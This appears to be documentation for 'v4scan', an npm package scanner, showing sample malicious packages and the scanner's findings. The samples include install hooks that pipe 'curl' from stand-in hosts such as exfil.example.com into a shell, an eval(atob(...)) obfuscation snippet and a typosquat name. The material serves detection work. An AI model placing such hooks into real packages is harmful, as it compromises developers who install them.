# Examples — what v4scan actually reports

Each folder under `examples/` is a small package. Run any of them yourself:

```bash
v4scan examples/01-postinstall-curl-sh --explain
```

The reports below are the **real** output of `v4scan` (no edits). Severity order:
`HIGH` → fails a CI gate (exit 1); `MEDIUM`/`LOW` → advisory.

---

## 1. `postinstall` → `curl | sh` → payload  ← the marquee case

**`package.json`**
```json
{
  "name": "mcp-notion-sync",
  "version": "1.2.0",
  "description": "Sync your Notion workspace to an MCP server",
  "scripts": {
    "postinstall": "curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh"
  }
}
```

**What v4scan reports**
```
[HIGH] install-script-execution — risky token 'curl' in script 'postinstall'
  Package executes external/unsafe commands during install. This is the primary supply-chain attack vector.
  evidence: curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh

[MEDIUM] network-egress-at-install — network egress token 'https://' in script 'postinstall'
  Network call during install can exfiltrate data or pull second-stage payloads.
  evidence: curl -sSL https://cdn.example-mcp.io/bootstrap.sh | sh

[MEDIUM] missing-provenance — no provenance/signed-attestation artifact found
[LOW]    thin-metadata — no repository/license metadata present
```

**Why it blocks:** the package reaches out to the internet and pipes a remote script
straight into a shell **during `npm install`** — before you've read a line of its code.
This is the exact pattern behind most real-world npm supply-chain compromises.

---

## 2. Typosquat of a top package

**`package.json`**
```json
{
  "name": "lodeash",
  "version": "4.17.21",
  "description": "Lodash utility library",
  "repository": "https://github.com/lodeash/lodeash",
  "license": "MIT"
}
```

**What v4scan reports**
```
[HIGH] typosquat — package name 'lodeash' is distance 1 from popular 'lodash'
  Name resembles a popular package — classic typosquat attack surface.
  evidence: 'lodeash' vs 'lodash' (levenshtein=1)

[MEDIUM] missing-provenance — no provenance/signed-attestation artifact found
```

**Why it blocks:** the name is one keystroke off `lodash` (one of the most-installed
packages on npm). A developer who mistypes the install command pulls *this* instead.
The repository link is a decoy.

---

## 3. Obfuscated decode-and-execute

**`index.js`**
```js
// a benign-looking formatter whose payload is decoded and executed
const payload = "ZXZhbChhdG9iKCJjb25zb2xlLmxvZygncGwnKSIpKQ==";
eval(atob(payload));
```

**What v4scan reports**
```
[HIGH] obfuscation — decode-and-execute pattern 'eval(atob'
  Pattern decodes then executes — hallmark of obfuscated malicious logic.
  evidence: found 'eval(atob' in examples/03-obfuscated-eval\index.js

[MEDIUM] obfuscation — high-entropy content block (entropy=5.12)
[MEDIUM] obfuscation — long base64-like run (length 44)
[MEDIUM] missing-provenance — no provenance/signed-attestation artifact found
```

**Why it blocks:** the payload is base64-encoded and only decoded at runtime inside an
`eval`. Static readers (and most humans) see an innocent string; v4scan flags the
`eval(atob(...))` decode-and-execute pattern directly.

---

## 4. Install-time network exfiltration

**`package.json`**
```json
{
  "name": "mcp-slack-bridge",
  "version": "2.0.0",
  "description": "Bridge Slack events into your MCP server",
  "scripts": {
    "preinstall": "node -e \"require('child_process').execSync('curl -s https://exfil.example.com/x | sh')\""
  }
}
```

**What v4scan reports**
```
[HIGH] install-script-execution — risky token 'curl' in script 'preinstall'
  Package executes external/unsafe commands during install. This is the primary supply-chain attack vector.
  evidence: node -e "require('child_process').execSync('curl -s https://exfil.example.com/x | sh')"

[MEDIUM] network-egress-at-install — network egress token 'https://' in script 'preinstall'
  Network call during install can exfiltrate data or pull second-stage payloads.
  evidence: node -e "require('child_process').execSync('curl -s https://exfil.example.com/x | sh')"

[MEDIUM] missing-provenance — no provenance/signed-attestation artifact found
[LOW]    thin-metadata — no repository/license metadata present
```

**Why it blocks:** the exfiltration runs in `preinstall`, *before* the package is even
linked — so there is no post-install step you can review after the fact.

---

## 5. Benign-but-thin (the "soft" signals)

**`package.json`**
```json
{
  "name": "my-internal-tool",
  "version": "0.0.1"
}
```

**What v4scan reports**
```
[MEDIUM] missing-provenance — no provenance/signed-attestation artifact found
[LOW]    thin-metadata — no repository/license metadata present
```

**Why it matters:** this one is *not* blocked (exit 0). But it shows v4scan's softer
risk surface — packages with no provenance attestation and no repository/license are
exactly the ones most often used as cover for the attacks above. Worth a second look
before you depend on them.

---

### Run them all
```bash
for d in examples/*/; do echo "== $d =="; v4scan "$d" --explain; done
```
